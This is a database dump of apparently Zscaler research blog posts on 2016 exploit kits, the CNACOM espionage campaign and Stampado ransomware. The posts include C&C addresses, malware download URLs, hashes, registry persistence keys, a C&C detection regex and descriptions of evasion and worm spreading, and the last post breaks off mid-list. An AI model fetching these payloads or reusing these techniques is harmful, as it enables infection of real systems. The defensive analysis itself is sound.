Neutrino traffic abruptly stopped. Security researchers reported that the seller of Neutrino announced (on a closed forum) that all activity would be halted. This came shortly after a large malvertising campaign using Neutrino to deliver CrypMIC was taken down.        Figure 1: Neutrino hits, September - November 2016    Although Neutrino was reported to be shut down around September 21st, some gates and compromised sites remained active for a short time thereafter, redirecting to inactive landing pages.    Neutrino-v    Since the shutdown of the standard Neutrino, a new variant first noted by Kafeine has emerged. Neutrino-v has been a relatively low-volume EK mainly active in South Korea and Taiwan. This variant features a modified landing page and a retooled CVE-2016-4117 flash exploit.    Neutrino-v has been seen dropping Cerber payloads.    RIG Exploit Kit        Figure 2: RIG hits, September - November 2016        Figure 3: RIG heat map    RIG has managed to achieve the position of the current top active exploit kit. As Angler and Neutrino each shut down, RIG has surged in activity to help fill the void in ransomware distribution. In particular, RIG took over distribution of CrypMIC after Neutrino ceased activity in late September.    RIG-v        Figure 4: RIG-v hits, October - November 2016    In mid-September, a new variant of the RIG EK (coined “RIG-v” by Kafeine) began to surface. RIG-v features a different URI scheme, modified landing page obfuscation, and RC4 encryption.        Figure 5: RIG-v landing page request        Figure 6: RIG-v landing page    RIG-v has primarily been observed dropping Cerber and CryptFile2 ransomware payloads.    RIG-E    Another RIG variant, RIG-E, was also observed, as it was launched quietly in August. This variant uses the standard RIG URL scheme, and in mid November, switched to the RC4-encrypted landing page introduced by RIG-v. RIG-E is mainly delivered by the EITest campaign.    Malware Traffic Analysis provided a recent data dump of standard RIG, RIG-v, and RIG-E chains    KaiXin Exploit Kit    KaiXin is a smaller exploit kit, first identified in 2012. KaiXin typically targets Asian sites, and has been delivered via banner ads and JavaScript injection on compromised sites. SANS published an overview of a KaiXin EK malvertising session earlier this year.    KaiXin has had relatively low activity for the last couple years, though we have observed a recent increase in activity and changes in its chain.        Figure 7: Injected KaiXin script    In our recently observed samples, KaiXin masquerades as a CNZZ statistics tracking script and uses URL encoding to trivially obfuscate the injected script.        Figure 8: Deobfuscated KaiXin script    The KaiXin injected script prevents the malicious iFrame from being delivered if the request user-agent is from an iOS or Android device. It also saves a dictionary in local browser storage with the current date and number of times the script has been executed to prevent the exploit chain from executing more than once per day and more than five times total.        Figure 9: Recent KaiXin SWF delivery page    The initial KaiXin landing page, which has no obfuscation, contains logic for handling different browsers (including QQ Browser). Internet Explorer (IE) browsers (version 10 or 11) are redirected to a SWF delivery page. For IE browsers older than version 10, the victim is redirected to an obfuscated exploit for CVE-2016-0189. CVE-2016-0189 had also been deployed in the Sundown EK and Neutrino EK in July, immediately after proof-of-concept code became available.    KaiXin is currently delivering adware packages, such as software from Baidu.    Other Exploit Kits    Sundown Exploit Kit    Sundown, still a relatively new EK, is gradually becoming more active, particularly with malvertising campaigns. In September, we observed a malvertising campaign in which Sundown was served alongside RIG.        Figure 10:     More information on this campaign can be found in our September blog post on malvertising chains.    In mid-October, we also began to observe some variations on typical Sundown exploit chains.    Angler Exploit Kit    Still inactive.    Nuclear Exploit Kit    Still inactive.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware, infection could result in the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as those described in this report, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-fall-2016');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (83, 'CNACOM - Open Source Exploitation via Strategic Web Compromise', 'Ed Miles', 'December 01, 2016', 'Introduction\r\n\r\nSince a full proof of concept for CVE-2016-0189 vulnerability was published on GitHub, Zscaler ThreatLabZ has been closely tracking its proliferation. The first copying of the exploit code we spotted was from the Sundown exploit kit (EK), followed closely by Magnitude and a resurgent KaiXin EK. In addition to the commoditized EKs, this exploit code has been leveraged in numerous one-shot and gated web-exploitation campaigns, delivered through a mix of the usual malvertising networks and compromised websites.\r\n\r\nThis blog details CNACOM, a web-based campaign that appears to be related to a well-known nation-state actor more commonly associated with spear-phishing attacks.\r\n\r\nInfection Cycle\r\n\r\n\r\n\r\nFigure 1 - An overview of the campaign\'s infection flow, highlighting the targeted organizations\r\n\r\nOn November 7, we spotted a malicious injection on the registration page of a major Taiwanese public service website. An iframe was injected into the footer of the page, which then loaded a unique landing page containing the CVE-2016-0189 exploit code.\r\n\r\n \r\n\r\n\r\n\r\nFigure 2 - An injected iframe with the name \"abc\" redirects visitors to the attack code\r\n\r\nThe landing page, hosted on an RHCloud virtual private server (VPS), begins with a nearly identical copy of the GitHub-published code, though the payload invocation appears to use a sandbox escape via CVE-2015-0116.\r\n\r\n \r\n\r\n\r\n\r\nFigure 3 - A VBScript function named \"abc\" uses a combination of CVE-2016-0189 as well as what appears to be CVE-2015-0116 to gain code execution outside of the Internet Explorer (IE) sandbox\r\n\r\nFollowing the exploit code, things get a lot more interesting. The user\'s external IP address is stored as a string and an ipToInt() function is defined, followed by a set of subroutines to collect details from the user machine. The code gathers the OS version, browser name, version, and language setting, Flash and Java versions, installed Office version, and finally the raw User-Agent string from the browser. This is all sent to the RHCloud host via a GET request. \r\n\r\n\r\n\r\nFigure 4 - The landing page collects many aspects of the user\'s platform, including MS Office version information\r\n\r\nAfter the fingerprinting code, the user\'s IP address is checked against Taiwanese government network ranges. If the user is coming from one of the targeted networks and is using a version of Internet Explorer, exploitation will be attempted.\r\n\r\n\r\n\r\nFigure 5 - The exploitation routine will be triggered for any Internet Explorer version, as long as the user\'s IP address is in one of the nine target networks\r\n\r\nThreatLabZ was able to follow the infection cycle and download a sample that appears to be a variant of the IXESHE AES malware. IXESHE is a family of backdoor malware known to be utilized by an attack group identified by various names including the IXESHE label, APT12, Numbered Panda, and DynCalc.\r\n\r\n\r\n\r\nFigure 6 - Upper: among other changes seen, the new variant builds stack strings up to 4 bytes at a time. Lower: old variants do it byte-by-byte\r\n\r\nUpon execution, the malware gathers the Windows username, hostname, local IP address, and Windows version. The hostname is fed to a PJW hash, or ElfHash function to generate a machine ID used in callbacks. The last step before initiating the C&C check-in is to achieve persistence by installing a run key in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Messenger.\r\n\r\n\r\n\r\nFigure 7 - Simplified decompiled code for the persistence mechanism shows the Run key utilized\r\n\r\nThis sample uses almost similar communication techniques as previous variants, with the addition of SSL. In our observations, we saw the server present a self-signed certificate with short, random-looking strings in the informational fields.\r\n\r\n\r\n\r\nFigure 8 - A self signed certificate is used for the C&C server\r\n\r\nCallback URLs\r\n\r\n\r\n	\r\n	/CEL%d=%d.cgi?%s - check-in at startup (and after certain C&C reset/error conditions)\r\n	\r\n	\r\n	/DES%d=%d.cgi?%s - standard beacon, check for command\r\n	\r\n	\r\n	/RES%d=%d.cgi?%s - response to rsh command\r\n	\r\n	\r\n	/SDU%d=%d.cgi?%s - error response\r\n	\r\n	\r\n	/SUS%d=%d.cgi?%s - check-out after receiving shutdown message\r\n	\r\n\r\n\r\nAs can be seen above, the callback URLs utilize the same general format: three capital letters denoting the response function or condition, an integer representing the PJW/ElfHash based host ID, an equal sign (\"=\"), a random integer, the string \".cgi?\", and a base64 response blob (which in some cases simply encodes another random integer).  The following regular expression matches this variant\'s URL path/query components: [CDRS][EDU][LSU]\\d+=\\d+\\.cgi\\?[a-zA-Z0-9=\\+\\/]+.\r\n\r\n\r\n\r\nFigure 9 - A collapsed view of the decompiled C&C command processing code shows handling for multiple input commands and several response types\r\n\r\nUnlike many historical IXESHE samples, it appears that this variant doesn\'t utilize campaign codes embedded in the malware itself. This may be due to a more centralized tracking system that only relies on the malware reporting a machine ID.\r\n\r\n \r\n\r\nConclusion\r\n\r\nThis analysis represents a snapshot of recent activity related to the CNACOM campaign. Additionally, we have identified an exploitation campaign active in August 2015 that appears to have utilized the HackingTeam Flash exploit for CVE-2015-5122, though the landing page at that time targeted a different set of Taiwanese government networks. Whether or not the threat actor behind this campaign is actually the group named APT12, the targeting of Taiwanese government networks and the similarity of this strain to historic IXESHE samples provide strong reasons for suspicion.\r\n\r\nZscaler ThreatlabZ will continue to monitor activity from this group ensuring protection against this threat.\r\n\r\nIndicators of Compromise\r\n\r\n \r\n\r\n\r\nFilename: cnacom.exe\r\nSource: cnacom-organied.rhcloud\\.com/cnacom.exe\r\nMD5: ACFA9C664016BFE5DB92557E923744F0\r\nCompile Time: 11/04/2016 11:56:27\r\nHardcoded User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0\r\nC&C: 74.200.214.226\r\n\r\n \r\n\r\nReferences\r\n\r\n\r\n	http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf\r\n	https://www.arbornetworks.com/blog/asert/wp-content/uploads/2014/06/ASERT-Threat-Intelligence-Brief-2014-07-Illuminating-Etumbot-APT.pdf', 'APT', 'https://www.zscaler.com/blogs/research/cnacom-open-source-exploitation-strategic-web-compromise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (84, 'A look at recent Stampado ransomware variant', 'Atinderpal Singh', 'November 21, 2016', 'Introduction\r\n\r\nStampado is one of the many new ransomware strains we have seen in 2016. Stampado was first seen in the wild in July 2016, as one of the cheapest pieces of ransomware available on the underground forums.  \r\n\r\n\r\n\r\nFigure 1: Stampado sales ad on dark web\r\n\r\nIn this report, we will provide an analysis of Stampado ransomware, shown to be capable of encrypting files with more than 1,200 file extensions and containing self-propagating features. In addition to the typical ransom demand, this variant threatens to delete a randomly selected file every six hours until payment and, if no payment is received within 96 hours, all files will be permanently deleted.\r\n\r\nInfection Cycle\r\n\r\nStampado typically arrives via spam e-mail or drive-by downloads. The file we examined was packed using UPX packer and written in AutoIt. Upon unpacking and decompilation, the AutoIt code appears to be obfuscated.\r\n\r\n\r\n\r\nFigure 2: Obfuscated Code\r\n\r\nUpon deobfuscation, the code appears as shown below:\r\n\r\n\r\n\r\nFigure 3: Deobfuscated code\r\n\r\nInstallation and persistence\r\n\r\nThe malware installs itself in the %AppData% folder with the name scvhost.exe in an attempt to look like a genuine Windows process (svchost.exe) and also creates the following autostart registry entry\r\n\r\n\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Windows Update\" %AppData%\\scvhost.exe\r\n\r\nStampado runs itself from the new location as scvhost.exe and terminates the current process.\r\n\r\n\r\n\r\nFigure 4: Installation and persistence code\r\n\r\nThe main functionality of the Stampado variant is illustrated in the infographic below:\r\n\r\n\r\n\r\nFigure 5: Stampado overall activity diagram\r\n\r\nSelf-replication\r\n\r\nThis ransomware also has a worm-like spreading functionality. It attempts to make a copy of itself on the removable drives and network drives reachable from the infected system. The malware also registers a callback function to monitor the removable drives; this way, it can infect the removable drive as soon as it connects to the compromised system.\r\n\r\nIt drops a copy of itself at [DrivePath]\\myDisk\\drivers.exe with file attributes set to +SHR to hide itself, creates file [DrivePath]\\autorun.inf and creates shortcut files with the names of existing files pointing to malware executable, after hiding the original files. This will cause the malware executable to run when the user clicks on any shortcut file.\r\n\r\n\r\n\r\nFigure 6: Self-replication code\r\n\r\nProcess Protection\r\n\r\nBefore starting file encryption, the malware protects its process from being terminated by exploiting an old kernel bug (setting the \"ProcessSelfDelete\" flag). This trick was verified to be working on Windows 7 64-bit.\r\n\r\n\r\n\r\nFigure 7: Process Protection Code\r\n\r\nEncryption over encryption\r\n\r\nStampado will not spare you even if you have already been infected with other ransomware strains and will re-encrypt already encrypted files. The victim has to pay ransom twice to get the original files back. This ransomware is targeting files already encrypted by multiple ransomware families along with a long list of important filetypes. Some of the targeted files encrypted by other ransomware strains are:\r\n\r\n\r\n\"*.locky;*.zepto;*.cerber;*.crypt;*.crypz;*.cryptowall;\r\n*.enciphered;*.cryptolocker;*.cryp1; *.lol!;*.breaking_bad;\r\n*.crypted;*.encrypted;*.xxx;*.crjoker;*.encrypt;*.zcrypt;*.EnCiPhErEd;\"\r\n\r\nStampado encrypts files using AES (Advanced Encryption Standard) and a Symmetric key encryption algorithm (which uses same key for encryption and decryption) with key length of 256. It generates encryption key based on following data:\r\n\r\nsalt string + embedded e-mail + “stamp” + ComputerName + CPUArch + OSArch + “pado”\r\n\r\n\r\n\r\nFigure 8: Part of the Stampado encryption key generation code\r\n\r\nNote: salt string is not present in all samples(not present in sample analyzed)\r\n\r\nIt searches following folders for files to encrypt from home drive:\r\n\r\n\r\n\r\nFigure 9: Building list of folders for file encryption\r\n\r\nThe malware excludes the following folders from the home drive: Windows, Program Files, User Profiles.\r\n\r\nAfter building a list of folders to encrypt, Stampado will start encrypting files one by one. It will create a temporary file with random name including ~(7 random characters).tmp, for example, ~afzyatd.tmp, ~irusgld.tmp, or ~ifecffl.tmp, to save the intermediate encrypted file. Once fully encrypted, the original file gets deleted and the temporary file gets renamed to a hexadecimal string with a \".locked\" extension.\r\n\r\nWhile encrypting files, Stampado avoids wasting its time on unimportant files by excluding files if their path or name contains the following strings:\r\n\r\n\r\n	\"Temporary Internet Files\"\r\n	\"INetCache\"\r\n	\"desktop.ini\"\r\n	\"stampado_debug.txt\" \r\n\r\n\r\nThe file stampado_debug.txt is possibly what was used by the author during development of the malware.\r\n\r\nStampado will also maintain two files in the %AppData% folder with hexadecimal names; one file is for the list of encrypted files and the other is for the status of malware activities.\r\n\r\n\r\n\r\nFigure 10: List of encrypted files maintained by Stampado\r\n\r\n\r\n\r\nFigure 11: Maintained status of activity during different stages\r\n\r\nWhen the encryption of all the target file types is complete, Stampado will display a ransom note as shown below:\r\n\r\n\r\n\r\nFigure 12: Stampado ransom note\r\n\r\nThe victim is instructed to contact the attacker over the displayed email address for further information on the ransom required and method of payment. The malware says it will delete the key from the command and control (C&C) server after 96 hours, but this is not true, as there is no private key involved. But it does attempt to delete all encrypted files from the system if no ransom is paid within 96 hours.\r\n\r\nCleanup and remediation\r\n\r\nThe ransom note shows the unique ID of the victim and includes a text box to accept the decryption key. If accepted and submitted, the key will decrypt the files and delete itself from system. The variants of Stampado we have seen use symmetric encryption, and the encryption key is generated locally based on the victim’s system details along with other constant values — without any communication to the C&C server.\r\n\r\n\r\n\r\nFigure 13: Decryption and cleanup window\r\n\r\nTo clean a system after a Stampado infection, you will either need to enter the decryption code or kill the process and remove the autostart entries, which would save your files from being deleted. If you are unable to kill the process, you can run the following command in order to remove the autostart registry entry, which prevents the malware from running after system restart:\r\n\r\n\r\nREG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Windows Update\"\r\n\r\nRestart the system, run folowing command on command prompt to delete scvhost.exe from %AppData% folder and use the freely available decrypter by Fabian Wosar to decrypt your files.\r\n\r\n\r\nCD %APPDATA%\r\n\r\nDEL scvhost.exe\r\n\r\nConclusion\r\n\r\nRansomware remains one of the most prevalent threats in 2016. We have seen over a dozen new ransomware families in the wild actively targeting users. Fortunately, in the case of Stampado, it is relatively easy to recover your files. We advise you not to pay the ransom, as it is possible to decrypt your files without doing so. To protect your data against ransomware, always keep your software updated and conduct regular backups.\r\n\r\nIndicators of Compromise:\r\n\r\n\r\nMD5: 5a40644131c9c7e5dc0603d774a36e6c\r\n\r\nURL serving sample: grmpixelmon[.]co/stampado.exe\r\n\r\nFiles dropped:\r\n\r\n%AppData%\\scvhost.exe\r\n\r\n%AppData%\\<Hexdecimalname>\r\n\r\n%AppData%\\<Hexdecimalname>\r\n\r\n[DrivePath]\\myDisk\\drivers.exe\r\n\r\n<filepath>/<encryptedname>.locked\r\n\r\nRegistry Entries Created:\r\n\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Windows Update\"\r\n\r\nExtensions targeted\r\n\r\nStampado encrypts a total of 1,240 file type extensions. Its list includes extensions used by other ransomware families, including Locky, Crypted, Encrypted, zCrypt, CryptoWall, Cryptz, CryptoLocker, and others.\r\n\r\nBelow is the list of all extensions:\r\n\r\n\r\n\"*.jpg;*.jpeg;*.gif;*.bmp;*.tiff;*.c;*.doc;*.docx;*.ppt;*.pptx;*.xls;*.xlsx;*.mov;*.mp3;*.cpp;*.au3;*.pas;*.php;*.wav;*.wma;*.wmv;*.mp4;*.rar;*.zip;*.7z;*.001;*.html;*.pdf;*.txt;*.ai;*.dmg;*.dwg;*.ps;\r\n*.flv;*.xml;*.skp;*.aiml;*.sql;*.cdr;*.svg;*.png;*.ico;*.ani;*.m4a;*.avi;*.csv;*.d3dbsp;*.sc2save;*.sie;*.sum;*.ibank;*.t13;*.t12;*.qdf;*.gdb;*.tax;*.pkpass;*.bc6;*.bc7;*.bkp;*.bak;*.qic;*.bkf;*.sidn;\r\n*.sidd;*.mddata;*.itl;*.itdb;*.icxs;*.hvpl;*.hplg;*.hkdb;*.mdbackup;*.syncdb;*.gho;*.cas;*.map;*.wmo;*.itm;*.sb;*.fos;*.mcgame;*.vdf;*.ztmp;*.sis;*.sid;*.ncf;*.menu;*.layout;*.dmp;*.blob;*.esm;*.vtf;\r\n*.dazip;*.fpk;*.mlx;*.kf;*.iwd;*.vpk;*.tor;*.psk;*.rim;*.w3x;*.fsh;*.ntl;*.arch00;*.lvl;*.snx;*.cfr;*.ff;*.vpp_pc;*.lrf;*.m2;*.mcmeta;*.vfs0;*.mpqge;*.kdb;*.db0;*.DayZProfile;*.rofl;*.hkx;*.bar;*.upk;\r\n*.das;*.iwi;*.litemod;*.asset;*.forge;*.ltx;*.bsa;*.apk;*.re4;*.sav;*.lbf;*.slm;*.bik;*.epk;*.rgss3a;*.pak;*.big;*.unity3d;*.wotreplay;*.xxx;*.desc;*.py;*.m3u;*.js;*.css;*.rb;*.p7c;*.p7b;*.p12;*.pfx;\r\n*.pem;*.crt;*.cer;*.der;*.x3f;*.srw;*.pef;*.ptx;*.r3d;*.rw2;*.rwl;*.raw;*.raf;*.orf;*.nrw;*.mrwref;*.mef;*.erf;*.kdc;*.dcr;*.cr2;*.crw;*.bay;*.sr2;*.srf;*.arw;*.3fr;*.dng;*.indd;*.eps;*.pdd;*.psd;*.dbfv;\r\n*.mdf;*.wb2;*.rtf;*.wpd;*.dxg;*.xf;*.pst;*.accdb;*.mdb;*.pptm;*.ppsx;*.pps;*.xlk;*.xlsb;*.xlsm;*.wps;*.docm;*.odb;*.odc;*.odm;*.odp;*.ods;*.odt;*.json;*.dat;*.efx;*.sdf;*.vcf;*.ses;*.wallet;*.1password;\r\n*.write;*.ini;*.axx;*.md;*.manifest;*.aes;*.fdb;*.fdk;*.gdk;*.db;*.veg;*.3ds;*.anim;*.bvh;*.fxa;*.ge2;*.iff;*.ma;*.mb;*.mcfi;*.mcfp;*.mel;*.mll;*.mp;*.mtl;*.obj;*.ogex;*.raa;*.rtg;*.skl;*.soft;*.spt;\r\n*.swatch;*.vrimg;*.2015;*.qif;*.t14;*.ofx;*.qfx;*.ebc;*.ebq;*.iif;*.ptb;*.tax2014;*.qbw;*.mye;*.qbm;*.myox;*.ets;*.tax2012;*.tax2013;*.tt14;*.lgb;*.epb;*.500;*.txf;*.tax2011;*.qbo;*.t11;*.t15;*.gpc;\r\n*.tax2015;*.tlg;*.qtx;*.itf;*.tt13;*.t10;*.qsd;*.ofc;*.bc9;*.tax2010;*.13t;*.mny;*.qxf;*.amj;*.m14;*._vc;*.tbp;*.qbk;*.aci;*.npc;*.sba;*.qbmb;*.cfp;*.nv2;*.tt12;*.n43;*.tfx;*.let;*.des;*.210;*.dac;\r\n*.slp;*.tax2009;*.qb2013;*.qbx;*.saj;*.ssg;*.zdb;*.t09;*.tt15;*.epa;*.qch;*.qby;*.tax2008;*.pd6;*.qbr;*.ta1;*.rdy;*.sic;*.lmr;*.pr5;*.op;*.brw;*.asec;*.crypt8;*.crypt;*.obb;*.crypt12;*.crypt7;*.rem;\r\n*.ksd;*.db.crypt8;*.sdtid;*.iwa;*.sme;*.crypt10;*.vdata;*.key;*.menc;*.acsm;*.crypt5;*.p7s;*.aee;*.crypt9;*.jpgenx;*.db.crypt7;*.awsec;*.adoc;*.eslock;*.emc;*.pp7m;*.p7e;*.signed;*.ftil;*.sec;*.jse;\r\n*.gpg;*.p7m;*.ize;*.ple;*.tc;*.crypted;*.vsf;*.enc;*.ifs;*.jpgx;*.p7z;*.uhh;*.cxt;*.bioexcess;*.pgp;*.cip;*.mse;*.aes256;*.c2v;*.hds;*.muk;*.dcv;*.pi2;*.eoc;*.pdc;*.mpqe;*.ee;*.kdbx;*.egisenc;*.dc4;\r\n*.hde;*.hid2;*.spk;*.rgss2a;*.cng;*.flka;*.sth;*.afp;*.rfp;*.rsa;*.wbp;*.hsh;*.ekb;*.lf;*.v2c;*.flk;*.lock3;*.uea;*.aex;*.wbc;*.cfd;*.sef;*.clk;*.leotmi;*.hid;*.crypt6;*.base64;*.safe;*.asc;*.pde;\r\n*.lxv;*.skr;*.jsn;*.kwm;*.apw;*.hc;*.vmdf;*.k2p;*.db.crypt5;*.cfe;*.daf;*.pkk;*.dim;*.img3;*.pkr;*.secure;*.rxf;*.cgp;*.dsc;*.xdb;*.epf;*.keychain;*.p7x;*.puf;*.enk;*.switch;*.mck;*.edc;*.auth;*.docenx;\r\n*.uue;*.prv;*.stxt;*.zbb;*.eff;*.dwk;*.fpa;*.sign;*.mfs;*.sdsk;*.pdfenx;*.pwl;*.embp;*.ecr;*.mnc;*.czip;*.mim;*.ppenc;*.csj;*.edat;*.ueaf;*.jpegenx;*.eea;*.devicesalt;*.pae;*.mcrp;*.zix;*.jbc;*.daz;\r\n*.nip;*.dsa;*.lma;*.hdt;*.bfa;*.migitallock;*.flkb;*.xia;*.1pif;*.kgb;*.kde;*.cpt;*.hop;*.kge;*.bfe;*.svz;*.ibe;*.bpk;*.tzp;*.bnc;*.ptxt;*.sgz;*.xef;*.flkw;*.crl;*.wmt;*.poo;*.cyp;*.uu;*.vf3;*.pkcs12;\r\n*.rsdf;*.xcon;*.ad;*.vp;*.meo;*.docxenx;*.sdc;*.pf;*.efa;*.mbz5;*.rpz;*.cry;*.qze;*.saa;*.wmg;*.sjpg;*.pvk;*.alk;*.afs3;*.lp7;*.txtenx;*.abc;*.opef;*.eee;*.agilekeychain;*.vme;*.$48E2C16BE0736950;\r\n*.gte;*.egs;*.mkeyb;*.fve;*.pandora;*.rdz;*.wza;*.jpi;*.smbp;*.pjpg;*.efu;*.xmm;*.paw;*.rte;*.rbb;*.atc;*.azf;*.suf;*.isk;*.xrm-ms;*.x26;*.cef;*.apv;*.sxl;*.rarenx;*.xlsxenx;*.ontx;*.rae;*.___fpe;\r\n*.passwordwallet4;*.zipenx;*.dwx;*.uenc;*.sxml;*.aos;*.dse;*.a2r;*.xxe;*.avn;*.pwa;*.xlsenx;*.zbd;*.efl;*.azs;*.efr;*.sde;*.psw;*.sdo;*.aen;*.fgp;*.jpegx;*.mkey;*.ent;*.hpg;*.dco;*.sgn;*.pie;*.y8pd;\r\n*.pcxm;*.lrs;*.pkey;*.gxk;*.ica;*.cpx;*.b2a;*.ntx;*.tmw;*.efs;*.req;*.__b;*.xdc;*.bmpenx;*.zps;*.bms;*.eid;*.ppk;*.rdk;*.rzx;*.sdoc;*.icp;*.raes;*.fpenc;*.htmlenx;*.att;*.tpm;*.pswx;*.viivo;*.mjd;\r\n*.mtd;*.pkd;*.fcfe;*.pptxenx;*.cae;*.zxn;*.$48E2CB6B205D6950;*.ync;*.can;*.p7a;*.crypt11;*.mbs;*.cryptomite;*.xlsl;*.flwa;*.chi;*.sda;*.grd;*.ezk;*.pkf;*.abcd;*.etxt;*.hex;*.arm;*.tsc;*.jcrypt;*.spn;\r\n*.aut;*.walletx;*.pptenx;*.uud;*.jrl;*.hsf;*.fdp;*.dpd;*.rng;*.xfi;*.yenc;*.mcat;*.chml;*.ueed;*.fss;*.msd;*.bsk;*.pnne;*.ska;*.gifenx;*.shy;*.vbox;*.sti;*.pwv;*.efc;*.bexpk;*.cdb;*.dst;*.mono;*.v11pf;\r\n*.macs;*.dsf;*.exportedfavorites;*.eno;*.sbe;*.egisenx;*.SafeText;*jpg_encrypted;*.aepkey;*.ivex;*.xlse;*.tifenx;*.jmc;*.osf;*.mhtenx;*.btoa;*.pvr;*.pdfl;*.spd;*.dlm;*.acl;*.svq;*.drc;*.ism;*.appt;\r\n*.sxm;*.nsx;*.rzk;*.clu;*.vzn;*.rzs;*.pcp;*.sppt;*.p7;*.lok;*.cryptra;*.crpt;*.ccp;*.ppsenx;*.pdv;*.xfl;*.ks;*.rdi;*.dotxenx;*.otp;*.icd;*.bpw;*.xlsxl;*.doce;*.aexpk;*.clx;*.mhtmlenx;*.aas;*.smht;\r\n*.cml;*.dotmenx;*.hbx;*.sccef;*.kne;*.prvkr;*.s1j;*.dhcd;*.xlamenx;*.ppsxenx;*.docxl;*.potmenx;*.pptl;*.ppte;*.docl;*.box;*.jmcp;*.nc;*.jmck;*.exc;*.jmcr;*.ccitt;*.dcf;*.jmcx;*.jmce;*.cfog;*.fl;*.nef;\r\n*.spb;*.bbb;*.iso;*.jsonlz4;*.tib;*.asd;*.sbf;*.dbk;*.nbu;*.nba;*.nbf;*.ecbk;*.sbu;*.nco;*.nrg;*.ssn;*.zw1;*.qcn;*.hbk;*.zap13;*.ex_;*.mbk;*.wbk;*.psc;*.ffu;*.ftmb;*.trn;*.mrimg;*.ipd;*.spba;*.skb;\r\n*.jpa;*.mpb;*.bdb;*.vbk;*.bpn;*.mscz,;*.ssc;*.uid-zps;*.nbi;*.svs;*.qbb;*.rom;*.abu1;*.svd;*.xar;*.nbz;*.gbk;*.vfs4;*.ebk;*.stg;*.wbcat;*.dl_;*.pbb;*.bkup;*.fbk;*.ab;*.hm4;*.iab;*.dat_old;*.bk!;*.tofp;\r\n*.set;*.wbfs;*.wbverify;*.v2i;*.ashdisc;*.avz;*.jrs;*.gbp;*.mcg;*.vbf;*.abk;*.baz;*.nbak;*.bk2;*.ghs;*.mbf;*.imm;*.pcv;*.backup;*.qdf-backup;*.purgeable;*.sn3;*.ashbak;*.backupdb;*.nfb;*.amk;*.bsr;\r\n*.dt6;*.enz;*.nri;*.p2i;*.spi;*.image;*.bbk;*.fkc;*.cbu;*.old;*.qb2015;*.original_epub;*.wim;*.original_mobi;*.qb2014;*.svl;*.fpbf;*.fxh;*.fbf;*.okr;*.bp1;*.ctf;*.mib;*.pbd;*.mon;*.sparseimage;\r\n*.vbox-prev;*.arc;*.dss;*.nbd;*.ctz;*.ttbk;*.cmp;*.bps;*.jwc;*.pck;*.win;*.ofb;*.vrb;*.nfc;*.dsb;*.bk0;*.pbf;*.tdr;*.osbx;*.ctx;*.rpk;*.ibak;*.sparsebundle;*.orig;*.bfs;*.tmp;*.smea;*.awb;*.fbc;*.icbu;\r\n*.qdb;*.ren;*.bpp;*.omg;*.pcd;*.blend1;*.ichat;*.lbk;*.krt;*._docx;*.tpb;*.tcs;*.ori;*.rbf;*.mbak;*.moz-backup;*.dsk;*.bmr;*.bk1;*.1-step;*.wcf;*.bff;*.bca;*.bks;*.cbk;*.ssb;*.fb;*.tly;*.ckp;*.diy;\r\n*.wbf1;*.201;*.metadata;*.gcb;*.jbk;*.buc;*.umb;*.arz;*.gbm;*.bkz;*.ipe;*.npb;*.ebi;*.rrr;*.eg;*.rdb;*.bku;*.da1;*.mbkp;*.wkp;*.dat_mcr;*.iobit;*.p15;*.1p4_zip;*.tig;*.sqb;*.vbb;*.bko;*.cvt;*.mv_;\r\n*.zw5;*.ecb;*.ima;*.bki;*.sbb;*.tk2;*.ibz;*.gws;*.fwb;*.wbb;*.mkz;*.whb;*.dmd;*.pca;*.mbsb;*.bac;*.wed;*.saved;*.999;*.i5d;*.pdb;*.msnbak;*.nru;*.ntj;*.bud;*.nrd;*.p14;*.dbe;*.gsba;*.kbb;*.bk3;*.rbk;\r\n*.1;*.bpb;*.bk5;*.tbk;*.wspak;*.sik;*.cps;*.gbck;*.psb;*.bfw;*.uas;*.npf;*.mb2;*.nv3;*.rmbak;*.cln;*.obk;*.iv2i;*.smsbackup;*.jaf;*.wbu;*.cmb;*.gb1;*.nrm;*.och;*.fri;*.msgstoredbcrypt7;*.whx;*.p21;\r\n*.wjf;*.rmb;*.bak~;*.vmf_autosave;*.QuickBooksAutoDataRecovery;*.ssp;*.undo;*.pbr;*.mdinfo;*.{pb;*.hcb;*.bz1;*.lcb;*.nab;*.nrc;*.img;*.nb7;*.pd2;*.bkc;*.bm3;*.v2b;*.r15;*.~mn;*.zw6;*.da0;*.000;*.brz;\r\n*.dkb;*.a$48E2C67BE07D6950;*.wpb;*.pchd;*.fbu;*.bakx;*.hm~;*.qmd;*.llx;*.ldb;*.sbk;*.xfd;*.rman;*.bjf;*.re3;*.bk4;*.acr;*.quickenbackup;*.ndu;*.in1;*.v30;*.sn1;*.mbu;*.nwbak;*.~de;*.blend2;*.wa~;*.adk;\r\n*.ate;*.wmc;*.rbr;*.utb;*.myc;*.sn2;*.bak3;*.rec;*.ajl;*.previous;*.nrb;*.swc;*.pcu;*.ob3;*.tb2;*.p03;*.fez;*.extz;*.uci;*.00b;*.aja;*.rb4;*.pqb;*.mscx,;*.rkn;*.~y7;*.drt;*.bpa;*.vbak;*.pal;*.nvf;*.p24;\r\n*.rb0;*.r20;*.tmb;*.aea;*.vsr;*.btx;*.r16;*.ob;*.2db;*.udif;*.cig;*.---;*.r14;*.p2v;*.sat;*.bp0;*.r00;*.out;*.r10;*.sun;*.p00;*.acd-bak;*.r13;*.~dp;*.zw3;*.bak1;*.nr4;*.mrbak;*.p04;*.bvw;*.hbi;*.pb;\r\n*.!@!;*.bk6;*.p